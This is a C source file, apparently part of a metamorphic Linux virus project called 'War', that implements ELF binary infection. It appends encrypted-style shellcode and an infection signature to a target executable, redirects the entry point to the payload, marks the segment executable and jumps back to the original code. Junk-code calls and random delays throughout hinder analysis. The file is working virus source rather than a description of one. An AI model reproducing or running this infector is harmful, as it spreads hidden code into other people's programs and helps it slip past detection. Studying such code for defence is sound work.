#include "../include/war.h"
#include "../include/metamorph_shellcode.h"

static int write_infected_file(const char *filepath, void *data, size_t size)
{
	int fd;
	ssize_t written;
	struct stat st;
	mode_t original_mode = 0644;
	if (stat(filepath, &st) == 0)
	{
		original_mode = st.st_mode;
	}
	fd = custom_open(filepath, O_WRONLY | O_TRUNC);
	if (fd < 0)
		return -1;
	written = custom_write(fd, data, size);
	fchmod(fd, original_mode);
	custom_close(fd);
	if (written < 0 || (size_t)written != size)
		return -1;
	return 0;
}

int infect_binary(const char *filepath)
{
	t_elf elf = {0};
	void *new_data = NULL;
	size_t new_size;
	size_t original_size;
	long long save;
	Elf64_Ehdr *new_ehdr;
	Elf64_Phdr *new_phdr;
	Elf64_Shdr *new_shdr;
	int ret = -1;

	save = pepino;
	insert_garbage();
	int order = get_execution_order();
	pepino *= 11;

	if (order == 0 || order == 1)
	{
		if (parse_elf(filepath, &elf) < 0)
			return -1;
		insert_garbage3();
	}
	pepino += 23432;
	if (order == 2 || order == 3)
	{
		if (parse_elf(filepath, &elf) < 0)
			return -1;
		insert_garbage4();
	}
	insert_garbage4();

	if (is_infected(&elf))
	{
		cleanup_elf(&elf);
		return 0;
	}
	random_delay();

	original_size = elf.size;
	uint64_t original_entry = elf.ehdr->e_entry;

	// Find the last PT_LOAD segment
	Elf64_Phdr *phdr = (Elf64_Phdr *)((char *)elf.data + elf.ehdr->e_phoff);
	Elf64_Phdr *last_load_seg = NULL;
	size_t last_load_idx = 0;
	size_t max_end = 0;

	for (int i = 0; i < elf.ehdr->e_phnum; i++)
	{
		if (phdr[i].p_type == PT_LOAD)
		{
			size_t seg_end = phdr[i].p_offset + phdr[i].p_filesz;
			if (seg_end > max_end)
			{
				max_end = seg_end;
				last_load_seg = &phdr[i];
				last_load_idx = i;
			}
		}
	}

	if (!last_load_seg)
	{
		cleanup_elf(&elf);
		return -1;
	}

	// Calculate payload virtual address
	uint64_t payload_vaddr = last_load_seg->p_vaddr + last_load_seg->p_memsz;

	// Generate jump to original entry point
	unsigned char jmp_to_original[14];
	size_t jmp_size;

	uint64_t jmp_from = payload_vaddr + METAMORPH_SHELLCODE_SIZE;
	uint64_t jmp_to = original_entry;
	int64_t rel_offset = (int64_t)(jmp_to - (jmp_from + 5));

	if (rel_offset >= INT32_MIN && rel_offset <= INT32_MAX)
	{
		jmp_to_original[0] = 0xE9;
		*(int32_t *)(&jmp_to_original[1]) = (int32_t)rel_offset;
		jmp_size = 5;
	}
	else
	{
		jmp_to_original[0] = 0xFF;
		jmp_to_original[1] = 0x25;
		*(uint32_t *)(&jmp_to_original[2]) = 0;
		*(uint64_t *)(&jmp_to_original[6]) = jmp_to;
		jmp_size = 14;
	}

	// Get signature for injection
	const char *sig = get_signature();
	size_t sig_len = strlen(sig) + 1;

	// Calculate total injection size: shellcode + jump + signature
	size_t total_injection_size = METAMORPH_SHELLCODE_SIZE + jmp_size + sig_len;
	new_size = original_size + total_injection_size;

	new_data = malloc(new_size);
	if (!new_data)
	{
		cleanup_elf(&elf);
		return -1;
	}

	insert_garbage5();

	// Copy original ELF
	memcpy(new_data, elf.data, original_size);
	cleanup_elf(&elf);

	// Copy metamorph shellcode (only the shellcode, not the entire War binary)
	memcpy((char *)new_data + original_size, metamorph_shellcode, METAMORPH_SHELLCODE_SIZE);

	// Copy jump instruction
	memcpy((char *)new_data + original_size + METAMORPH_SHELLCODE_SIZE, jmp_to_original, jmp_size);

	// Copy signature
	memcpy((char *)new_data + original_size + METAMORPH_SHELLCODE_SIZE + jmp_size, sig, sig_len);

	// Modify headers
	new_ehdr = (Elf64_Ehdr *)new_data;
	new_phdr = (Elf64_Phdr *)((char *)new_data + new_ehdr->e_phoff);
	new_shdr = (Elf64_Shdr *)((char *)new_data + new_ehdr->e_shoff);

	// Change entry point to shellcode
	new_ehdr->e_entry = payload_vaddr;

	// Extend the segment
	new_phdr[last_load_idx].p_filesz += total_injection_size;
	new_phdr[last_load_idx].p_memsz += total_injection_size;

	// Make segment executable if not already
	if (!(new_phdr[last_load_idx].p_flags & PF_X))
	{
		new_phdr[last_load_idx].p_flags |= PF_X;
	}

	// Extend last section
	int last_section = -1;
	size_t max_offset = 0;
	for (int i = 0; i < new_ehdr->e_shnum; i++)
	{
		size_t section_end = new_shdr[i].sh_offset + new_shdr[i].sh_size;
		if (section_end > max_offset && section_end <= original_size)
		{
			max_offset = section_end;
			last_section = i;
		}
	}

	insert_garbage5();

	if (last_section >= 0)
		new_shdr[last_section].sh_size += total_injection_size;

	ret = write_infected_file(filepath, new_data, new_size);
	free(new_data);

	pepino = save;
	pepino *= 1;
	return ret;
}